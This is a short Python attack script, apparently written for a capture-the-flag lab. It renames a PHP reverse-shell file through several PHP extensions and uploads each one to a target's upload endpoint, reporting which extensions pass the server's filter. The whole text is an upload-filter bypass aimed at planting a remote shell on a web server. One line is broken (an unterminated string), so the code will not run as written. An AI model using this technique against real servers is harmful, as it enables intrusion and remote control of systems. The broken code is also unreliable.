#!/usr/bin/env python

import requests, os

ip = "10.10.83.93"
url = f"http://{ip}:3333/internal/index.php" 		

old_file = "/home/php-reverse-shell.php" 

file = "/home/php-reverse-shell
extensions = [
	".php",
	".php3",
	".php4",
	".php5",
	".phtml",
]


for ext in extensions:

	new_file = file + ext 				# forms which extension of the reverse shell works
	os.rename(old_file, new_file)			#renames the file after testing

	files = {"file": open(new_file, "rb")}		#python requests to upload a file
	r = requests.post(url, files=files)

	if "Extension not allowed" in r.text:
		print(f"{ext} not allowed")
	else:
		print(f"{ext} is allowed")	

	old_file = new_file				#resets the file name after resetting from os.rename
